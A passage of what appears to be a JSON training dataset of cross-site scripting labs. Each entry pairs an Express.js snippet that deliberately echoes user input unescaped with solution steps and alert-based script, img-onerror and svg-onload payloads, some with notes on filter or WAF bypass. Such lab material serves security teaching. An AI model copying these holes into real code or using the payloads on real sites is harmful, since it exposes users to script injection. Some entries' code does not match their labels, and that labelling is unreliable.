        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-ticket', (req, res) => {\n  const title = req.body.title;\n  res.send(`<div>${title}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('TicketXSS')</script>",
            "<img src=x onerror=alert('Ticket')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in task management app project name",
        "Lab Description": "Users create projects with names rendered without sanitization. To solve: Inject a script payload into the project name field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a project named <script>alert('ProjectXSS')</script>.",
            "View project dashboard.",
            "Observe persistent XSS execution.",
            "Test variations with different event handlers.",
            "Validate across user roles."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-project', (req, res) => {\n  const project = req.body.project;\n  res.send(`<h3>${project}</h3>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('ProjectXSS')</script>",
            "<svg/onload=alert('Project')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online auction bid page",
        "Lab Description": "The auction platform reflects item names during bid confirmation without escaping. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Place bid with item name: <script>alert('Auction')</script>.",
            "Observe execution in bid confirmation.",
            "Use alternative encoded payloads.",
            "Fuzz for multiple vulnerable fields.",
            "Monitor DOM mutations."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/bid-item', (req, res) => {\n  const item = req.body.item;\n  res.send(`<p>Bid placed on: ${item}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('Auction')</script>",
            "<img src=x onerror=alert('AuctionXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in recipe sharing app recipe title",
        "Lab Description": "Recipe titles are displayed on the homepage without sanitization. To solve: Inject a script payload into the recipe title.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a recipe with title: <script>alert('RecipeXSS')</script>.",
            "Open homepage and observe XSS.",
            "Test additional HTML event injections.",
            "Validate across user sessions.",
            "Test variations with nested tags."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const title = req.body.title;\n  res.send(`<div>${title}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('RecipeXSS')</script>",
            "<img src=x onerror=alert('Recipe')>"
        ]
    },
    {
        "Lab scenario": "DOM-based XSS in dynamic poll creation page",
        "Lab Description": "Poll options are dynamically inserted from localStorage without escaping. To solve: Inject a script into the localStorage option.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Set localStorage.pollOption = '<img src=x onerror=alert(\"Poll\")>'.",
            "Reload poll creation page.",
            "Observe execution on load.",
            "Test nesting payloads inside table rows.",
            "Validate execution persistence."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-poll', (req, res) => {\n  const option = req.body.option;\n  res.send(`<li>${option}</li>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<img src=x onerror=alert('Poll')>",
            "<svg/onload=alert('PollXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online bookstore author bio field",
        "Lab Description": "Authors can submit bios for their profile pages. The input is displayed without sanitization. To solve: Inject a stored XSS payload into the bio.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit bio with <script>alert('AuthorXSS')</script>.",
            "Reload the author's profile page.",
            "Observe execution of the script.",
            "Test for multiple event handlers.",
            "Confirm persistence after logout/login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  res.send(`<div>${bio}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('AuthorXSS')</script>",
            "<img src=x onerror=alert('Author')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in product search filter",
        "Lab Description": "A product search filter reflects user input in search results without sanitization. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Search using: <script>alert('SearchXSS')</script>.",
            "Observe payload execution in the results page.",
            "Try encoded payloads for filter bypass.",
            "Confirm behavior across browsers.",
            "Test different injection vectors."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-products', (req, res) => {\n  const query = req.body.query;\n  res.send(`<h2>Search results for: ${query}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('SearchXSS')</script>",
            "<svg/onload=alert('Search')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in student portal project title",
        "Lab Description": "Students submit project titles which are rendered without escaping. To solve: Inject a stored XSS payload in the title.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a project titled <script>alert('StudentXSS')</script>.",
            "Open project list page and observe execution.",
            "Try multiple payloads with nested elements.",
            "Confirm persistence across sessions.",
            "Fuzz to detect other affected fields."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-project', (req, res) => {\n  const title = req.body.title;\n  res.send(`<li>${title}</li>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('StudentXSS')</script>",
            "<img src=x onerror=alert('Project')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in appointment booking confirmation page",
        "Lab Description": "Booking confirmation reflects user-entered name unsanitized. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Book an appointment using: <script>alert('BookingXSS')</script> as your name.",
            "Observe script execution in the confirmation.",
            "Check for alternative reflected fields.",
            "Test various payload formats.",
            "Monitor behavior on mobile and desktop."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/confirm-booking', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Booking confirmed for: ${name}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('BookingXSS')</script>",
            "<img src=x onerror=alert('Booking')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in movie rating site review field",
        "Lab Description": "Movie reviews are displayed without escaping user input. To solve: Inject a persistent XSS payload into the review field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post a review with: <script>alert('MovieXSS')</script>.",
            "Reload the movie page and observe execution.",
            "Test variations using different HTML elements.",
            "Confirm persistence after session logout.",
            "Check for other reflective fields."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  res.send(`<blockquote>${review}</blockquote>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('MovieXSS')</script>",
            "<svg/onload=alert('Review')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in newsletter subscription success message",
        "Lab Description": "Subscription confirmation reflects email address without escaping. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Subscribe with: <script>alert('SubscribeXSS')</script> as email.",
            "Observe execution in the confirmation page.",
            "Try URL encoding and alternative vectors.",
            "Confirm script execution on reload.",
            "Test across different browser types."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h1>Welcome ${email}!</h1>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('SubscribeXSS')</script>",
            "<img src=x onerror=alert('Newsletter')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug tracker issue title",
        "Lab Description": "Bug tracker displays issue titles without escaping. To solve: Inject a persistent XSS payload into the issue title field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a bug report with: <script>alert('BugXSS')</script> as the title.",
            "Visit the issues page and observe execution.",
            "Test with different events (onmouseover, onclick).",
            "Confirm script persistence across reloads.",
            "Try nested tags for more complex injections."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-bug', (req, res) => {\n  const title = req.body.title;\n  res.send(`<div>${title}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('BugXSS')</script>",
            "<svg/onload=alert('Bug')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in discount coupon generation page",
        "Lab Description": "Coupon codes are displayed back to users without encoding input. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Request coupon with code: <script>alert('CouponXSS')</script>.",
            "Observe execution on the page.",
            "Check for event-based payloads too.",
            "Monitor network requests for stored reflections.",
            "Test encoded injection formats."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/generate-coupon', (req, res) => {\n  const coupon = req.body.coupon;\n  res.send(`<h2>Your coupon: ${coupon}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('CouponXSS')</script>",
            "<img src=x onerror=alert('Coupon')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in music sharing app playlist description",
        "Lab Description": "Playlist descriptions are rendered without escaping user input. To solve: Inject a stored XSS payload into the playlist description.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a playlist with description: <script>alert('MusicXSS')</script>.",
            "Open the playlist page and observe execution.",
            "Test different payload structures.",
            "Try injecting SVG and iframe elements.",
            "Confirm execution across devices."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-playlist', (req, res) => {\n  const description = req.body.description;\n  res.send(`<div>${description}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('MusicXSS')</script>",
            "<svg/onload=alert('Playlist')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in travel booking system review form",
        "Lab Description": "Travelers can leave reviews after completing trips. The application renders reviews without sanitizing input. To solve: Inject a stored XSS payload into the review form.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Book a trip and leave a review: <script>alert('TravelXSS')</script>.",
            "Reload the trip review page.",
            "Observe payload execution.",
            "Try event handler based payloads.",
            "Confirm execution on mobile view too."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  res.send(`<p>${review}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('TravelXSS')</script>",
            "<img src=x onerror=alert('Trip')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in blog comment preview",
        "Lab Description": "Before submitting a comment, users see a preview that reflects their input without escaping. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Enter a comment: <script>alert('PreviewXSS')</script>.",
            "Observe preview page for script execution.",
            "Test using SVG-based payloads.",
            "Try encoded injection as well.",
            "Monitor network traffic for reflections."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-comment', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<div>${comment}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('PreviewXSS')</script>",
            "<svg/onload=alert('CommentPreview')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online food ordering app restaurant description",
        "Lab Description": "Restaurant owners can submit descriptions, which are displayed to customers without sanitization. To solve: Inject a stored XSS payload into the description.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Register a restaurant and use: <script>alert('FoodXSS')</script> as description.",
            "Visit the listing page.",
            "Observe script execution.",
            "Test complex payload chaining techniques.",
            "Verify execution across different accounts."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-restaurant', (req, res) => {\n  const description = req.body.description;\n  res.send(`<section>${description}</section>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('FoodXSS')</script>",
            "<img src=x onerror=alert('Restaurant')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in user feedback acknowledgment page",
        "Lab Description": "Feedback confirmation pages reflect user inputs directly. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit feedback: <script>alert('FeedbackXSS')</script>.",
            "Observe execution immediately after submission.",
            "Fuzz other parameters for hidden reflections.",
            "Check behavior in different user roles.",
            "Confirm bypass techniques."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  res.send(`<h2>Your feedback: ${feedback}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('FeedbackXSS')</script>",
            "<svg/onload=alert('Feedback')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event management site event title field",
        "Lab Description": "Event titles created by organizers are displayed without escaping. To solve: Inject a stored XSS payload into the title.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create an event titled <script>alert('EventXSS')</script>.",
            "Open the event listing page.",
            "Observe script execution.",
            "Test different event handlers.",
            "Confirm execution across different user views."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-event', (req, res) => {\n  const title = req.body.title;\n  res.send(`<header>${title}</header>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('EventXSS')</script>",
            "<img src=x onerror=alert('Event')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online education platform signup form",
        "Lab Description": "Signup form reflects user input without sanitization. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Sign up with a username: <script>alert('SignupXSS')</script>.",
            "Observe the welcome page.",
            "Check if reflected in other fields too.",
            "Experiment with URL-encoded injections.",
            "Test bypassing simple keyword filters."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/signup', (req, res) => {\n  const username = req.body.username;\n  res.send(`<p>Welcome, ${username}!</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('SignupXSS')</script>",
            "<img src=x onerror=alert('Signup')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in social network post title",
        "Lab Description": "Users can create posts with titles that are rendered without escaping. To solve: Inject a stored XSS payload into the post title.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a post titled <script>alert('PostXSS')</script>.",
            "Open the main feed page.",
            "Observe script execution.",
            "Chain multiple payloads for wider attack surface.",
            "Test across different browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-post', (req, res) => {\n  const title = req.body.title;\n  res.send(`<article>${title}</article>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('PostXSS')</script>",
            "<svg/onload=alert('Post')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in email contact us form response",
        "Lab Description": "Contact form response page reflects user name unsanitized. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit the form with name: <script>alert('ContactXSS')</script>.",
            "Observe execution on confirmation page.",
            "Try double encoding for filter bypass.",
            "Monitor behavior on desktop and mobile.",
            "Test persistent input handling."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h2>Thanks for contacting us, ${name}!</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('ContactXSS')</script>",
            "<img src=x onerror=alert('Contact')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in internal HR portal employee announcement",
        "Lab Description": "Internal announcements by HR are displayed without sanitizing input. To solve: Inject a stored XSS payload in the announcement.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post an announcement with: <script>alert('HRXSS')</script>.",
            "Reload announcement dashboard.",
            "Observe payload execution.",
            "Experiment with mutation XSS as well.",
            "Confirm execution under different user permissions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-announcement', (req, res) => {\n  const announcement = req.body.announcement;\n  res.send(`<section>${announcement}</section>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('HRXSS')</script>",
            "<svg/onload=alert('Announcement')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in fitness app workout description",
        "Lab Description": "Users can create custom workout plans with descriptions. The description is rendered without sanitization. To solve: Inject a persistent XSS payload into the workout description.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a new workout with description <script>alert('WorkoutXSS')</script>.",
            "Reload the workout list page.",
            "Observe script execution.",
            "Test other input fields for reflections.",
            "Ensure it persists across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-workout', (req, res) => {\n  const description = req.body.description;\n  res.send(`<p>${description}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('WorkoutXSS')</script>",
            "<img src=x onerror=alert('Workout')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in flight booking search",
        "Lab Description": "Flight booking form reflects the destination parameter in the search result page without sanitization. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Search for flights with destination: <script>alert('FlightXSS')</script>.",
            "Observe script execution on results page.",
            "Test using encoded payloads for bypass.",
            "Monitor DOM behavior.",
            "Confirm execution across browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/search-flights', (req, res) => {\n  const destination = req.body.destination;\n  res.send(`<h2>Flights to: ${destination}</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('FlightXSS')</script>",
            "<svg/onload=alert('Flight')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online bookstore author bio",
        "Lab Description": "Authors can add bios which are displayed without escaping. To solve: Inject a stored XSS payload in the bio field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add author bio with <script>alert('AuthorXSS')</script>.",
            "Visit the author's page.",
            "Observe payload execution.",
            "Test multiple vectors in bio.",
            "Check persistence after logout/login."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-author', (req, res) => {\n  const bio = req.body.bio;\n  res.send(`<section>${bio}</section>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('AuthorXSS')</script>",
            "<img src=x onerror=alert('Author')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in password reset message",
        "Lab Description": "Password reset confirmation reflects email input without escaping. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Request password reset with email: <script>alert('ResetXSS')</script>.",
            "Observe confirmation message.",
            "Try encoded payloads.",
            "Monitor for script execution on confirmation page.",
            "Test multiple browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<p>Password reset link sent to ${email}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('ResetXSS')</script>",
            "<svg/onload=alert('Reset')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in recipe sharing site recipe name",
        "Lab Description": "Recipe names submitted by users are rendered directly. To solve: Inject a stored XSS payload in the recipe name field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a recipe titled <script>alert('RecipeXSS')</script>.",
            "View the recipe listing.",
            "Observe script execution.",
            "Test alternate injection techniques.",
            "Confirm behavior on mobile browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-recipe', (req, res) => {\n  const title = req.body.title;\n  res.send(`<h1>${title}</h1>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('RecipeXSS')</script>",
            "<img src=x onerror=alert('Recipe')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online exam platform result summary",
        "Lab Description": "After submitting an exam, the result page reflects the user's name without sanitization. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit an exam with username: <script>alert('ExamXSS')</script>.",
            "Check the result page.",
            "Observe if the script executes.",
            "Test URL-encoded payloads.",
            "Fuzz other fields for hidden vectors."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-exam', (req, res) => {\n  const username = req.body.username;\n  res.send(`<h2>Congratulations, ${username}!</h2>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('ExamXSS')</script>",
            "<svg/onload=alert('Exam')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online donation site donor message",
        "Lab Description": "Donor messages are displayed without escaping user input. To solve: Inject a stored XSS payload in the message field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Donate with a message: <script>alert('DonationXSS')</script>.",
            "Check the donor wall.",
            "Observe payload execution.",
            "Fuzz with different payload variants.",
            "Confirm execution across roles."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-donation', (req, res) => {\n  const message = req.body.message;\n  res.send(`<div>${message}</div>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('DonationXSS')</script>",
            "<img src=x onerror=alert('Donation')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in book review site reviewer name",
        "Lab Description": "Reviewer names are reflected unsanitized on the book review page. To solve: Inject a reflected XSS payload.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit a review with name: <script>alert('ReviewerXSS')</script>.",
            "Observe the reflection in review summary.",
            "Test URL encoding techniques.",
            "Try variations to evade WAF.",
            "Ensure cross-browser execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const reviewer = req.body.reviewer;\n  res.send(`<p>Review by: ${reviewer}</p>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('ReviewerXSS')</script>",
            "<img src=x onerror=alert('Review')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online petition platform supporter comment",
        "Lab Description": "Supporter comments are displayed without sanitization. To solve: Inject a stored XSS payload into the comment.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Sign a petition with comment: <script>alert('PetitionXSS')</script>.",
            "Check supporter comments page.",
            "Observe script execution.",
            "Fuzz the input for hidden fields.",
            "Test on mobile and desktop browsers."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/sign-petition', (req, res) => {\n  const comment = req.body.comment;\n  res.send(`<blockquote>${comment}</blockquote>`);\n});\n\napp.listen(3000);",
        "payloads": [
            "<script>alert('PetitionXSS')</script>",
            "<img src=x onerror=alert('Petition')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in project management tool task description",
        "Lab Description": "A project management tool allows users to add task descriptions. The input is stored and rendered without sanitization. To solve: Inject a persistent XSS payload in the task description field.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a task with <script>alert('TaskXSS')</script> as the description.",
            "Reload the task page and observe script execution.",
            "Test different payload variations.",
            "Use Burp Suite to confirm the payload is stored."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-task', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO tasks (description) VALUES (?)\", [description]);\n  res.send('Task created');\n});",
        "payloads": [
            "<script>alert('TaskXSS')</script>",
            "<img src=x onerror=alert('Task')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in online survey form",
        "Lab Description": "An online survey form reflects user input directly in the confirmation page without sanitization. To solve: Inject a reflected XSS payload in the name field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit the survey with <script>alert('Survey')</script> in the name field.",
            "Observe script execution on the confirmation page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-survey', (req, res) => {\n  const name = req.body.name;\n  res.send(`<h1>Thank you, ${name}!</h1>`);\n});",
        "payloads": [
            "<script>alert('Survey')</script>",
            "<svg onload=alert('Survey')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in e-learning platform assignment feedback",
        "Lab Description": "Students can submit feedback on assignments. The input is stored and displayed without escaping, leading to stored XSS. To solve: Inject a script in the feedback section.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback with <script>alert('Feedback')</script>.",
            "Observe execution on assignment review."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO feedbacks (text) VALUES (?)\", [feedback]);\n  res.redirect('/assignments');\n});",
        "payloads": [
            "<script>alert('Feedback')</script>",
            "<img src=x onerror=alert('Assignment')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in blog post title",
        "Lab Description": "Blog post titles are stored without sanitization, leading to stored XSS. To solve: Submit a malicious script as the post title.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a blog post title with <script>alert('Blog')</script>.",
            "Reload the blog list page to observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-post', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO posts (title) VALUES (?)\", [title]);\n  res.send('Post created');\n});",
        "payloads": [
            "<script>alert('Blog')</script>",
            "<img src=x onerror=alert('Blog')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in password reset form",
        "Lab Description": "The reset form reflects the user email without sanitization, allowing reflected XSS. To solve: Inject a script into the email field.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit a reset request with email <script>alert('Reset')</script>.",
            "Observe reflected payload execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  res.send(`<h2>Reset link sent to ${email}</h2>`);\n});",
